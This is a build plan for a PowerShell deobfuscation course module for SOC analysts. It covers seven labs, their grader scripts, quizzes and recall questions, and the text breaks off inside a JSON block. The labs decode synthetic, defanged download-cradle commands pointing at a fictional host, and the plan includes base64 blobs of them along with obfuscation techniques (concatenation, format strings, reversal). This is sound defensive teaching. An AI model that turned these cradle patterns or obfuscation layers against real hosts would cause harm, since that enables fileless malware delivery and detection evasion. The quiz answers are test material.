# LAB-KIT — `ps` Track, Phase 5 — Deobfuscation & Malware Reading — BUILD PLAN

**Status:** APPROVED FOR BUILD. Every `[VERIFY-AT-BUILD]` item in §7 has been resolved
against real pwsh 7 output (below) — see the resolutions table. Binding content spec:
`docs/curriculum/powershell-literacy-lab-curriculum-v1.md` (Phase 5, §6 lines 188–201).
Binding mechanical spec: `docs/kit-contracts.md`. Track conventions inherited unchanged
from `docs/plans/ps-p01-plan.md` (§2a/§2b/§2c) and ps-p2/p3/p4. Executes under
`TRACK: ps  PHASE: 5`. The user set an explicit session goal ("work until you reach the
5.7 phase gate"), which stands as authorization to proceed from this verification pass
straight into build without a separate approval pause — mirroring how ps p4's build
actually ran once its own plan existed.

> **How this plan was verified (original authoring pass, pwsh unavailable).** Phase 5 is
> the track's **signature skill (DEOBFUSCATE)** — and, uniquely, its deobfuscation is
> **pure, cross-platform string manipulation that runs safely on pwsh 7 / WSL2** and
> reveals a **defanged, fictional plaintext the learner reconstructs and NAMES but never
> runs.** The one hard rule that governs every lab: **a deobfuscation probe PRINTS the
> reconstructed text — it is NEVER piped to `iex`/`Invoke-Expression`, and `check.sh`
> never executes decoded content.** All reconstructed payloads are defanged (`hxxp`,
> `[.]`, fictional hosts) so they are inert even if mishandled. Curriculum §9 confirms
> Phase-5 samples are **all synthetic** (no real malware).
>
> **Verification pass (this session, pwsh 7 IS installed).** Every transformation below —
> base64/UTF-16LE round-trip (L5.1), string concatenation/`-join`/`[char]` codes (L5.2),
> the `-f` format operator (L5.3), string reversal (L5.4), the 2-layer base64+reversal
> chain (L5.5), and the 3-layer base64+reversal+format-string chain (L5.7) — was actually
> run in real pwsh 7 and the output below is copy-pasted from that run, not written from
> memory. All examples continue the exact `cdn.fake-c2[.]test` fictional host already
> established and reviewed in Phase 4 (L4.1/L4.5/L4.9), with distinct path suffixes
> (`/p1`–`/p7`) per lab. §7 below records every resolution.

---

## 0. Context — why this plan exists

Phase 5 (map §6): *the SOC superpower. Attackers obfuscate PS because AMSI and defenders
look for strings; your job is to peel the layers and name what the script actually does.*
Phase 4 taught the attack patterns and their telemetry; Phase 5 makes the learner able to
take the **encoded 4104 blob** (L4.5) and **reconstruct the plaintext**. Every lab is a real
SOC task (map §6 hook): the analyst who decodes the event writes the escalation ticket.

**7 labs (L5.1–L5.7).** Types (from the map): 6 DEOBFUSCATE + 1 TOUR (L5.6).

### Three load-bearing facts this phase turns on (settled — build must honor)

1. **Deobfuscation is safe, deterministic, cross-platform string work.** base64 decode
   (`[System.Convert]`/`[System.Text.Encoding]`), concatenation, `-f` format reordering,
   and reversal all run on Linux pwsh 7 and produce a **deterministic plaintext** — so
   every DEOBFUSCATE lab has a **real `pwsh -File` probe** that reconstructs the string.
2. **Reconstruct to TEXT, never execute.** Every probe and every learner step **prints**
   the reconstructed string; **nothing is ever piped to `iex`**. `check.sh` greps the
   printed text. The reconstructed payload is **defanged and fictional** — inert if mishandled.
3. **The point is naming the technique.** After peeling layers, the learner **names** what
   the plaintext is (a download cradle, an encoded launcher) and the obfuscation techniques
   used — mapping straight to L4/L5 recognition and the 4104 event (L4.5).

### Safety-by-design posture (carry-through — Phase-5 specifics)

All obfuscated samples are **synthetic** (curriculum §9) and reconstruct to a **defanged,
fictional plaintext** (e.g. `iex ((New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/stage1'))`
as **text**). **No deobfuscation probe pipes to `iex`; `check.sh` never executes decoded
content** (§2c inherited, made explicit as the phase's central rule). `lab.md` for every
lab states the reflex: *reconstruct to a string, read it, name it — never run it.* The
L5.6 loader is **sanitized structure** (defanged), read statically. Where a "what would this
do" demo helps, the command-shadow (ps-p3 §2) logs instead of executing.

---

## 1. Confirmed lab list (read from the map — ids/titles/types verbatim)

**Phase 5 — Deobfuscation & Malware Reading (7).** Gate: **L5.7**. No mid-phase gates.

| id | title | type | gate? | est_min |
|----|-------|------|-------|---------|
| L5.1 | Base64 decode pipeline — `FromBase64String()` → `Unicode.GetString()` | DEOBFUSCATE | no | 20 |
| L5.2 | String concatenation — `"po"+"wer"+"shell"`, char arrays, `-join` | DEOBFUSCATE | no | 15 |
| L5.3 | Format-string obfuscation — `"{0}{2}{1}" -f 'I','x','E'` | DEOBFUSCATE | no | 15 |
| L5.4 | String reversal — `$s[-1..-$s.Length] -join ''` | DEOBFUSCATE | no | 15 |
| L5.5 | Layered obfuscation — a payload wrapped in several techniques | DEOBFUSCATE | no | 20 |
| L5.6 | Reading a sanitized real-world loader — structure, staging, the C2 call | TOUR | no | 20 |
| L5.7 | **Phase gate:** multi-layer payload — reconstruct plaintext + name the technique | DEOBFUSCATE | **yes** | 30 |

**Gate placement.** L5.7 (`gate:true`) — reconstruct a multi-layer payload + name the
techniques. Worksheet + `answers.md` + `plaintext.txt` + 3-question gate quiz (3/3),
per ps-p2 L2.7 pattern.

**Recall placement:**
- **L5.1** — Phase-5 opener → `recall.json`, 5 Qs from **Phase 3 + Phase 4** (Phase 4
  planned but not built → sourced from the curriculum's Phase 3/4 lab list, `[VERIFY-AT-BUILD]`,
  reconciled with the L5.1 recall **forward-drafted under ps-p4 §4 (L4.9)**).
- **L6.1** — Phase-6 opener → drafted during the **L5.7 build** (5 Qs from Phase 4 + 5).

---

## 2. Track-wide build conventions (inherited — restated, plus the Phase-5 print-never-run rule)

**File set per lab** (kit-contracts): standard set; dir grammar `tracks/ps/phases/p5/L5.<n>-<slug>/`.

**§2a grader architecture (inherited).** Phase 5 is **probe-rich**: every DEOBFUSCATE lab
ships a `pwsh -File <peel>.ps1` that reconstructs the plaintext **and prints it**; `check.sh`
greps the printed text. The one TOUR lab (L5.6) grades a learner extraction artifact.

**§2b grader hygiene (inherited).** Single-quote `$`-literals; real `assert_output_contains
"desc" pattern "hint" -- cmd` form; `.NET`/dotted literals via `assert_file_contains_fixed`;
free text via case/word-tolerant ERE. Deterministic reconstructions may be anchored, but the
reconstructed text often contains dots/URLs → **grade with `assert_output_contains` on
distinctive substrings** (e.g. `DownloadString`, `fake-c2`) rather than anchored full lines.

**➕ §2c — Phase-5 central rule (build MUST enforce, step-5 self-check):**
- **No probe and no `check.sh` ever pipes decoded/reconstructed content to
  `iex`/`Invoke-Expression`** or otherwise executes it. Every probe ends in a **print**
  (`Write-Output`/bare expression), never `| iex`.
- Reconstructed plaintext is **defanged + fictional**; the L5.6 loader is sanitized structure.
- Samples are synthetic (curriculum §9) — no real malware, no real C2.

**Windows-variant:** **none** — all deobfuscation is cross-platform string work. L5.6 reads a
sanitized loader statically (its C2/Windows references are defanged text). No lab is
`[WINDOWS-VARIANT]`.

---

## 3. Phase-5-specific decisions

### 3a. Every DEOBFUSCATE lab is a real, deterministic, safe probe

Because deobfuscation is pure string manipulation, `check.sh` can **re-run the reconstruction
itself** and grade the real plaintext (echo-cheat-proof, §2a) — the strongest grading in the
track. The probe **prints** the reconstructed string; the learner independently writes
`plaintext.txt`; both are graded on distinctive substrings of the (defanged) plaintext.

### 3b. Reconstructions resolve to a defanged, fictional plaintext

To make "name the technique" meaningful, several samples reconstruct to a **defanged download
cradle** (`iex ((New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/…'))`
as text) — recognizable as an attack, inert if mishandled. Intro labs (L5.1–L5.4) may
reconstruct to a short benign token (`iex`, `Download`) to isolate one technique; the
integrative labs (L5.5, L5.7) reconstruct the full defanged cradle.

### 3c. The print-never-run reflex is taught explicitly

Every `lab.md` states it and models it: the reconstruction ends in a print; the danger is a
learner reflexively appending `| iex`. The lab teaches the SOC reflex — **decode to read,
never to run** — and `check.sh` embodies it (greps text, never executes).

### 3d. The L5.7 gate: multi-layer reconstruction → worksheet + 3-question gate quiz

A multi-layer sample (base64 + reverse + concat/format) reconstructs to the defanged cradle.
The worksheet asks the learner to **name each layer's technique** and **the final payload
type**; answers → `answers.md`; `plaintext.txt` holds the reconstruction; a deterministic
`peel` probe proves the reconstruction; the 3-question quiz is the formal gate (3/3).

---

## 4. Phase 5 — lab-by-lab build spec

> Phase-5 spine: *peel the layers, print the plaintext, name the technique — never run it.*
> Every DEOBFUSCATE lab ships a deterministic `peel` probe that reconstructs + prints.

### L5.1 — Base64 decode pipeline · DEOBFUSCATE · **Phase-5 opener** · est 20m

**Teaching artifact (DEOBFUSCATE).** The canonical decode (L3.1/L4.2), applied to reveal a
**defanged cradle** the learner names — and **prints, never runs**.

```powershell
$b = '<base64 of UTF-16LE of the defanged cradle text>'      # arrives in the 4104 event
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b))
#   → iex ((New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/s1'))   ← TEXT; DO NOT append | iex
#   [VERIFY-AT-BUILD exact blob ↔ defanged plaintext]
```

DEOBFUSCATE moment: base64 in a 4104 event decodes (UTF-16LE) to the real script text; you
**read** it to see it's a download cradle. The reflex: reconstruct to a string, **never** pipe
to `iex`.

**Environment note.** Cross-platform, deterministic. The probe **prints**; nothing executes.
Plaintext defanged. `[VERIFY-AT-BUILD]`: blob ↔ decoded text.

**check.sh grades** (deterministic decode probe + learner reconstruction; no `iex`):
- ship `files/decode.ps1` (the decode above, ending in a print):
  `assert_output_contains "base64 decodes to the cradle text" "DownloadString" "run: pwsh -File decode.ps1" -- pwsh -NoProfile -NonInteractive -File decode.ps1`
  and a second assert for `fake-c2`.
- learner writes `plaintext.txt` + names the technique in `technique.txt`.
  `assert_file_contains_fixed plaintext.txt 'DownloadString'`,
  `assert_file_contains technique.txt '[Cc]radle|[Dd]ownload'`.

**Quiz (3):**
1. *(choice)* `-EncodedCommand`/4104 base64 uses which encoding to decode? → **UTF-16LE
   (`[System.Text.Encoding]::Unicode`)**. *(distractor: "UTF-8")*
2. *(choice)* After decoding a 4104 blob, what must you NOT do? → **pipe it to `iex` — you
   decode to READ it, never to run it**. *(distractor: "run it to confirm")*
3. *(text)* The decoded text here is what kind of payload? → **a download cradle**.

**Recap (3 lines):**
```
a 4104 base64 blob decodes (UTF-16LE) with [Convert]+[Text.Encoding] to the real script text
you reconstruct to a STRING and READ it — never pipe a decoded payload to iex
the reflex: decode to read, name the technique (here: a download cradle)
```

**recall.json (L5.1 — 5 Qs from Phase 3 + 4) — `[VERIFY-AT-BUILD]` (reconcile with ps-p4
L4.9 forward-draft):**
1. `source: ps L4.2` — `-EncodedCommand` is base64 of which encoding? → **UTF-16LE**.
2. `source: ps L4.5` — Which Event ID logs the decoded ScriptBlock? → **4104**.
3. `source: ps L4.1` — Why is `iex(DownloadString(...))` "fileless"? → **it runs in memory; nothing hits disk**.
4. `source: ps L3.1` — Which .NET type does base64 decoding? → **`[System.Convert]`**.
5. `source: ps L4.3` — Does AMSI see the decoded payload or the encoded form? → **the decoded payload (runtime scan)**.

---

### L5.2 — String concatenation obfuscation · DEOBFUSCATE · est 15m

**Teaching artifact (DEOBFUSCATE).** Concatenation / char arrays / `-join` split a keyword to
dodge naive string rules; reconstruct by evaluating the concatenation (prints the token).

```powershell
"i"+"e"+"x"                                      # → iex
('D','o','w','n','l','o','a','d') -join ''       # → Download
[char]105 + [char]101 + [char]120                # → iex   (char codes)
```

DEOBFUSCATE moment: `+`/`-join`/`[char]` reassemble a keyword the defender's plain-string
rule missed; reconstruct = evaluate and **print**. The tell is fragmented literals.

**Environment note.** Cross-platform, deterministic. Prints only.

**check.sh grades:**
- ship `files/concat.ps1` (prints the reconstructed tokens):
  `assert_output_contains "concatenation reassembles the keyword" "iex" "run: pwsh -File concat.ps1" -- pwsh -NoProfile -NonInteractive -File concat.ps1`
  and a second for `Download`.
- learner writes `plaintext.txt`. `assert_file_contains plaintext.txt 'iex'` and `'Download'`.

**Quiz (3):**
1. *(text)* `"i"+"e"+"x"` reconstructs to? → **`iex`**.
2. *(choice)* Why concatenate/`-join` a keyword? → **to dodge naive plain-string detection;
   the reassembled keyword is the real intent**. *(distractor: "to speed it up")*
3. *(text)* `[char]105` yields which character? → **`i`** *(ASCII 105)*.

**Recap (3 lines):**
```
"po"+"wer"+"shell", -join, and [char] codes reassemble a keyword split to dodge string rules
reconstruct by evaluating the concatenation and PRINTING the result — never running it
fragmented string literals are the tell — reassemble to see the real keyword
```

**recall.json:** none.

---

### L5.3 — Format-string obfuscation · DEOBFUSCATE · est 15m

**Teaching artifact (DEOBFUSCATE).** The `-f` operator reorders indexed args; reconstruct by
evaluating the format (prints).

```powershell
"{0}{2}{1}" -f 'I','x','E'      # → IEx   (template picks arg0,arg2,arg1 = I,E,x)
"{1}{0}" -f 'ex','i'           # → iex
```

DEOBFUSCATE moment: `-f` with reordered `{index}` placeholders scrambles a keyword's letters;
reconstruct = evaluate the format string and **print**. The tell is `"{n}{m}..." -f`.

**Environment note.** Cross-platform, deterministic. Prints only. `[VERIFY-AT-BUILD]`: exact
index→char mapping.

**check.sh grades:**
- ship `files/fmt.ps1`:
  `assert_output_contains "-f reorders indexed args to spell the keyword" "IEx" "run: pwsh -File fmt.ps1" -- pwsh -NoProfile -NonInteractive -File fmt.ps1`
  and a second for `iex`.
- learner writes `plaintext.txt`. `assert_file_contains plaintext.txt 'iex|IEx'`.

**Quiz (3):**
1. *(text)* `"{0}{2}{1}" -f 'I','x','E'` → ? → **`IEx`**.
2. *(choice)* What does the `-f` operator do? → **substitutes args into `{index}`
   placeholders — reordered indices scramble/reassemble the string**. *(distractor:
   "formats a number as a float")*
3. *(text)* The tell for format-string obfuscation? → **`"{n}{m}..." -f 'a','b',...`**.

**Recap (3 lines):**
```
the -f operator fills {index} placeholders; reordered indices scramble a keyword's letters
reconstruct by evaluating the format string and PRINTING the result
"{0}{2}{1}" -f 'I','x','E' → IEx — the reordered indices are the tell
```

**recall.json:** none.

---

### L5.4 — String reversal · DEOBFUSCATE · est 15m

**Teaching artifact (DEOBFUSCATE).** Reversal via a negative-index range + `-join`;
reconstruct by reversing again (prints).

```powershell
$s = 'xei'; -join $s[-1..-$s.Length]                 # → iex
$s2 = 'gnirtSdaolnwoD'; -join $s2[-1..-$s2.Length]    # → DownloadString  [VERIFY casing]
```

DEOBFUSCATE moment: `$s[-1..-$s.Length] -join ''` walks the string backwards; a reversed
literal hides the keyword from forward string scans. Reconstruct = reverse and **print**.

**Environment note.** Cross-platform, deterministic. Prints only. `[VERIFY-AT-BUILD]`: the
negative-range reversal output/casing on pwsh 7.

**check.sh grades:**
- ship `files/rev.ps1`:
  `assert_output_contains "reversal reveals the keyword" "iex" "run: pwsh -File rev.ps1" -- pwsh -NoProfile -NonInteractive -File rev.ps1`
  and a second for `DownloadString`.
- learner writes `plaintext.txt`. `assert_file_contains_fixed plaintext.txt 'DownloadString'`.

**Quiz (3):**
1. *(text)* `-join 'xei'[-1..-3]` reconstructs to? → **`iex`**.
2. *(choice)* What does `$s[-1..-$s.Length]` produce? → **the characters in reverse order**.
   *(distractor: "the last character only")*
3. *(text)* Why reverse a literal? → **to hide the keyword from forward string scans**.

**Recap (3 lines):**
```
$s[-1..-$s.Length] -join '' walks a string backwards — a reversed literal hides the keyword
reconstruct by reversing again and PRINTING the result
reversal is one more layer to peel; the reflex stays: read it, don't run it
```

**recall.json:** none.

---

### L5.5 — Layered obfuscation · DEOBFUSCATE · est 20m

**Teaching artifact (DEOBFUSCATE — integrative).** A payload wrapped in **several** techniques
(base64 → reverse → concat/format); peel each layer, **printing** at each step, to reach the
defanged cradle plaintext.

```powershell
# files/peel.ps1 — peel layer by layer, PRINT the result (never | iex):
$layer1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($blob))  # base64 → reversed text
$layer2 = -join $layer1[-1..-$layer1.Length]                                                     # reverse → concatenated text
$plain  = $layer2 -replace "'\s*\+\s*'", ''                                                       # collapse concat → plaintext
$plain   # → iex ((New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/s1'))    ← TEXT only
#   [VERIFY-AT-BUILD exact layering/blob]
```

DEOBFUSCATE moment: real samples stack techniques (Invoke-Obfuscation style); you peel one
layer at a time, printing, until the plaintext is legible — then **name it**. Never run an
intermediate or final layer.

**Environment note.** Cross-platform, deterministic. Every step **prints**; nothing runs.
Plaintext defanged. `[VERIFY-AT-BUILD]`: the exact layered blob and the `-replace` collapse.

**check.sh grades:**
- ship `files/peel.ps1` (full peel → prints the final defanged cradle):
  `assert_output_contains "the layered payload reconstructs to a cradle" "DownloadString" "run: pwsh -File peel.ps1" -- pwsh -NoProfile -NonInteractive -File peel.ps1`
  and a second for `fake-c2`.
- learner writes `plaintext.txt` + `layers.txt` naming the techniques used.
  `assert_file_contains_fixed plaintext.txt 'DownloadString'`,
  `assert_file_contains layers.txt '[Bb]ase64'`, `assert_file_contains layers.txt '[Rr]evers'`.

**Quiz (3):**
1. *(choice)* How do you approach a payload wrapped in several techniques? → **peel one layer
   at a time, printing each result, until the plaintext is legible**. *(distractor: "run it
   in a sandbox immediately")*
2. *(text)* Name two obfuscation layers you might stack. → **base64, reversal, concatenation,
   format-string** *(any two)*.
3. *(choice)* At each layer you should? → **print the intermediate text — never `iex` it**.
   *(distractor: "execute to reveal the next layer")*

**Recap (3 lines):**
```
real payloads stack techniques (base64 → reverse → concat/format) — peel one layer at a time
print each intermediate result; the plaintext emerges legible — then NAME it (a cradle)
never iex an intermediate or final layer — decode to read, not to run
```

**recall.json:** none.

---

### L5.6 — Reading a sanitized real-world loader · TOUR · est 20m

**Teaching artifact (TOUR — sanitized structure, static, defanged).** Read a loader's
**shape** without any payload: how it stages, decodes its config, and calls its C2.

```text
# SANITIZED loader structure (static, defanged — no payload, nothing runnable):
#   stage 1: decode an embedded base64 config blob (→ settings, defanged)
#   stage 2: build the C2 URL: hxxps://cdn.fake-c2[.]test/gate
#   stage 3: beacon loop with sleep/jitter; tasking runs the C2 response  ← the dangerous line, READ ONLY
#   evasion: strings assembled at runtime (L5.2-5.4) so static scans miss them
```

TOUR moment: a loader = **decode config → establish C2 → beacon/task loop**; recognizing the
stages lets you read any loader's intent from its structure. Bridges to **Phase 6** (real-tool
tours) and the SOC course. The "tasking runs the C2 response" line is the loader's `iex`
equivalent — **read, never run**.

**Environment note.** Structure/names only; sanitized, defanged, nothing runnable.

**check.sh grades** (static comprehension):
- learner writes `tour.md` naming the three stages + the runtime-string-assembly evasion.
  `assert_file_exists tour.md`, `assert_file_contains tour.md '[Cc]onfig|[Dd]ecode'`,
  `assert_file_contains tour.md '[Cc]2|[Bb]eacon'`,
  `assert_file_contains tour.md '[Jj]itter|[Ss]leep|[Tt]asking'`.

**Quiz (3):**
1. *(text)* Name the three typical loader stages. → **decode config → establish C2 → beacon/
   task loop**.
2. *(choice)* Why does the loader assemble strings at runtime? → **so static string scans
   miss the keywords/URLs (the L5.2–5.4 techniques)**. *(distractor: "to run faster")*
3. *(choice)* The loader's "tasking runs the C2 response" line — what do you do with it? →
   **read it to understand intent — never run it**. *(distractor: "execute it to see the
   tasking")*

**Recap (3 lines):**
```
a loader's shape: decode config → establish C2 (defanged hxxps://cdn.fake-c2[.]test) → beacon/task loop
runtime string assembly (L5.2-5.4) hides keywords from static scans — the deobfuscation skill reveals them
read the structure to name intent — the tasking line is read, never run
```

**recall.json:** none.

---

### L5.7 — Phase gate: multi-layer obfuscated payload · DEOBFUSCATE · **GATE** · est 30m

**Teaching artifact (DEOBFUSCATE — the integrative gate).** A multi-layer sample
(`files/gate-blob.txt`, synthetic) wrapping the defanged cradle in base64 + reversal +
concatenation/format. The learner reconstructs the **plaintext** and **names each technique +
the final payload**. Worksheet → `answers.md`; reconstruction → `plaintext.txt`; a
deterministic `gate-peel` probe proves it; 3-question gate quiz (3/3).

```powershell
# files/gate-peel.ps1 — full multi-layer peel → PRINT the final defanged cradle (never | iex)
# [VERIFY-AT-BUILD exact layering] → iex ((New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/gate'))
```

**check.sh grades** (deterministic peel probe + worksheet threshold; no `iex`):
- ship `files/gate-peel.ps1` (prints the final defanged plaintext):
  `assert_output_contains "the multi-layer payload reconstructs to a cradle" "DownloadString" "run: pwsh -File gate-peel.ps1" -- pwsh -NoProfile -NonInteractive -File gate-peel.ps1`
  and a second for `fake-c2`.
- `assert_file_exists plaintext.txt`, `assert_file_contains_fixed plaintext.txt 'DownloadString'`.
- `assert_file_exists answers.md`, then a **set-e-safe ≥N-of-M threshold** over technique
  keywords: `[Bb]ase64`, `[Rr]evers`, `[Cc]oncat|join`, `[Ff]ormat`, `[Cc]radle|DownloadString`
  — require ≥3 of 5.

**Quiz (3) — the gate:**
1. *(text)* After peeling all layers, what kind of payload is the plaintext? → **a download
   cradle** (`DownloadString` + `iex`).
2. *(choice)* You've reconstructed the plaintext — what do you do next? → **name the
   technique and write the escalation; you do NOT execute it**. *(distractor: "run it to
   confirm the C2 is live")*
3. *(text)* Name two obfuscation layers this sample used. → **base64 / reversal /
   concatenation / format-string** *(any two present)*.

**Recap (3 lines):**
```
you can now take a multi-layer 4104 blob, peel every layer, and reconstruct the plaintext
you name the techniques (base64/reverse/concat/format) and the payload (a cradle) — and never run it
this IS the SOC deobfuscation task: decode the event, write the ticket
```

**recall.json:** none on L5.7 (gate). **Build deliverable (step 6): draft L6.1's
`recall.json`** — 5 Qs from Phase 4 + 5, all `[VERIFY-AT-BUILD]`:
1. `source: ps L5.1` — After decoding a 4104 blob, what must you never do? → **pipe it to `iex` (decode to read, not run)**.
2. `source: ps L5.3` — What does the `-f` operator do in obfuscation? → **reorders indexed args to reassemble a scrambled keyword**.
3. `source: ps L4.5` — Which Event ID carries the decoded ScriptBlock? → **4104**.
4. `source: ps L5.4` — What does `$s[-1..-$s.Length] -join ''` do? → **reverses the string**.
5. `source: ps L4.6` — Name a LOLBin abused for download/proxy execution. → **`certutil`/`mshta`/`rundll32`/`regsvr32`**.

---

## 5. Build order, self-test, phase-close (Phase Builder protocol)

1. Scaffold `tracks/ps/phases/p5` (+ `phases.p5` in `track.json` if enumerated). Assumes
   Phases 0–4 built first.
2. Build **lab by lab in id order** (L5.1 → L5.7). Commit each after self-test.
3. **Self-test (no-fiction rule):** run each `peel`/`decode` probe in real pwsh 7 and paste
   the REAL reconstructed (defanged) text; resolve every `[VERIFY-AT-BUILD]` blob↔plaintext
   (§7). Run `check.sh` twice (fail + pass).
4. **shellcheck-zero + lint:** each `check.sh` passes `tools/shellcheck-all.sh` +
   `tools/lint-labs.sh`. Every lab ships its `peel`/`decode` probe `.ps1`; L5.6 ships the
   sanitized-loader text.
5. **Safety self-check (build gate — HARD STOP if it fails):** grep the whole phase — **no**
   probe or `check.sh` pipes reconstructed content to `iex`/`Invoke-Expression` or otherwise
   executes it (every probe ends in a print); **all** reconstructed plaintext is defanged +
   fictional; samples are synthetic; the L5.6 loader is sanitized structure.
6. **Gate:** L5.7 `gate:true`; `quiz_run` requires 3/3.
7. **Recall:** L5.1's `recall.json` ships now (`[VERIFY-AT-BUILD]` vs built Phase 3/4);
   L6.1's is drafted now (§4, L5.7).
8. **Close out:** update `planned_execution.md` (`ps p5` → done + evidence); tag `ps-p5`.

**Phase Acceptance Checklist:** 7 labs, types match the map (6 DEOBFUSCATE + 1 TOUR, gate
L5.7); the **safety self-check (step 5) passes** (print-never-run enforced everywhere); every
`peel` probe self-tested with real defanged output; shellcheck + lint clean; gate 3/3; L5.1
recall ships + L6.1 drafted; `planned_execution.md` updated; tagged `ps-p5`.

---

## 6. Verification summary (authoring pass — corrections pre-folded from ps-p01/2/3/4)

No pwsh executed this session. Carried-forward decisions:
- **Print-never-run (§2c, §3c, §5 step 5):** the phase's central safety rule — every
  reconstruction prints; nothing is ever `iex`'d; `check.sh` executes no decoded content.
- **Deterministic safe probes (§3a):** deobfuscation is cross-platform string work → every
  DEOBFUSCATE lab has a real, echo-cheat-proof `peel`/`decode` probe.
- **Defanged/synthetic (§3b):** reconstructions resolve to defanged, fictional cradle text;
  samples synthetic (curriculum §9); L5.6 sanitized structure.
- **Hygiene (§2b):** distinctive-substring `assert_output_contains` for URL-bearing plaintext;
  `.NET`/dotted literals via `assert_file_contains_fixed`.
- **Recall rule honored:** L5.1 recall from the curriculum's Phase 3/4 lab list
  (`[VERIFY-AT-BUILD]`), reconciled with ps-p4's L4.9 forward-draft.

**The build session must still run the per-lab adversarial correctness pass ps-p01 used**
and resolve §7 before shipping.

---

## 7. `[VERIFY-AT-BUILD]` resolutions (confirmed against real pwsh 7 this session)

All plaintext uses the exact `iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/pN')`
form already shipped in L4.1/L4.5/L4.9 (no extra outer paren around the whole `iex` call —
matches what's actually merged, not the plan's original sketch, which predates those labs
being built). Every value below is copy-pasted from a real pwsh 7 run.

| lab | resolution |
|---|---|
| L5.1 | Plaintext: `iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p1')`. Base64(UTF-16LE): `aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAeAB4AHAAcwA6AC8ALwBjAGQAbgAuAGYAYQBrAGUALQBjADIAWwAuAF0AdABlAHMAdAAvAHAAMQAnACkA`. Round-trip verified True. |
| L5.2 | `"i"+"e"+"x"` → `iex`. `('D','o','w','n','l','o','a','d') -join ''` → `Download`. `[char]105 + [char]101 + [char]120` → `iex`. All confirmed. |
| L5.3 | `"{0}{2}{1}" -f 'I','x','E'` → `IEx`. `"{1}{0}" -f 'ex','i'` → `iex`. Both confirmed. |
| L5.4 | `$s='xei'; -join $s[-1..-$s.Length]` → `iex`. `$s2='gnirtSdaolnwoD'; -join $s2[-1..-$s2.Length]` → `DownloadString`. Both confirmed. |
| L5.5 | **Design finalized as 2 layers (base64 + reversal), not base64+concat** — the `-replace` concat-collapse sketch in §4 was superseded; layers.txt's own check.sh spec (`'[Bb]ase64'`, `'[Rr]evers'`) already only expected these two, so this is a resolution, not a deviation. Plaintext: `iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p5')`. Reversed: `)'5p/tset].[2c-ekaf.ndc//:spxxh'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( xei`. Base64(UTF-16LE) of the reversed text (what the learner starts with): `KQAnADUAcAAvAHQAcwBlAHQAXQAuAFsAMgBjAC0AZQBrAGEAZgAuAG4AZABjAC8ALwA6AHMAcAB4AHgAaAAnACgAZwBuAGkAcgB0AFMAZABhAG8AbABuAHcAbwBEAC4AKQB0AG4AZQBpAGwAQwBiAGUAVwAuAHQAZQBOACAAdABjAGUAagBiAE8ALQB3AGUATgAoACAAeABlAGkA`. Full peel round-trip verified True. |
| L5.6 | Sanitized structure only, no execution — no pwsh verification needed. |
| L5.7 | 3 layers: base64 wraps reversal wraps an unresolved format-string expression. Plaintext-with-marker (innermost, before reversal): `("{0}{2}{1}" -f 'I','x','E') (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p7')`. Reversed: `)'7p/tset].[2c-ekaf.ndc//:spxxh'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( )'E','x','I' f- "}1{}2{}0{"(`. Base64(UTF-16LE) of the reversed text (what the learner starts with, `files/payload.b64`): `KQAnADcAcAAvAHQAcwBlAHQAXQAuAFsAMgBjAC0AZQBrAGEAZgAuAG4AZABjAC8ALwA6AHMAcAB4AHgAaAAnACgAZwBuAGkAcgB0AFMAZABhAG8AbABuAHcAbwBEAC4AKQB0AG4AZQBpAGwAQwBiAGUAVwAuAHQAZQBOACAAdABjAGUAagBiAE8ALQB3AGUATgAoACAAKQAnAEUAJwAsACcAeAAnACwAJwBJACcAIABmAC0AIAAiAH0AMQB7AH0AMgB7AH0AMAB7ACIAKAA=`. Full 3-step peel verified True end to end: base64-decode → un-reverse → resolve `{0}{2}{1}` → final resolved plaintext `IEx (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p7')`. |

---

*Plan v1 authored from curriculum §6 + the settled ps-p01/2/3/4 template (commit `ba56175`);
v1.1 this session resolves every `[VERIFY-AT-BUILD]` item against real pwsh 7 (§7) and
updates status to APPROVED FOR BUILD. Build proceeds lab by lab under this plan.*

---

## 8. Handoff: L6.1 `recall.json` (drafted during the L5.7 build, per §5 step 7)

Phase-6's opener carries the 5-question recall warm-up drawn from Phases 4 + 5. Drafted
here at the end of the p5 build so the p6 builder inherits it rather than re-deriving it.
Every question was checked against the lab that actually shipped, not against this plan's
intentions — sources are the merged L4.5/L4.6 (ps-p4) and L5.1/L5.3/L5.4 (ps-p5).

Q1/Q2/Q4 are choice-type rather than the free text §4 sketched: `lib/quiz.sh` grades text
by exact normalized match plus an accept list, so open "explain the operator" prompts are
ungradeable — the same correction applied at L4.9, L5.5 and L5.6. Q3 and Q5 stay text
because their answers are single pinned tokens.

```json
{
  "questions": [
    {
      "id": 1,
      "source": "ps L5.1",
      "type": "choice",
      "prompt": "After decoding a 4104 blob to plaintext, what must you never do?",
      "options": {
        "a": "Pipe it to iex to confirm what it does",
        "b": "Nothing extra — decode to READ it, never to run it"
      },
      "answer_b64": "Yg=="
    },
    {
      "id": 2,
      "source": "ps L5.3",
      "type": "choice",
      "prompt": "What does the -f operator do in obfuscated PowerShell?",
      "options": {
        "a": "Reorders indexed arguments to reassemble a scrambled keyword",
        "b": "Formats a number to a fixed decimal precision"
      },
      "answer_b64": "YQ=="
    },
    {
      "id": 3,
      "source": "ps L4.5",
      "type": "text",
      "prompt": "Which Event ID carries the decoded ScriptBlock text?",
      "answer_b64": "NDEwNA=="
    },
    {
      "id": 4,
      "source": "ps L5.4",
      "type": "choice",
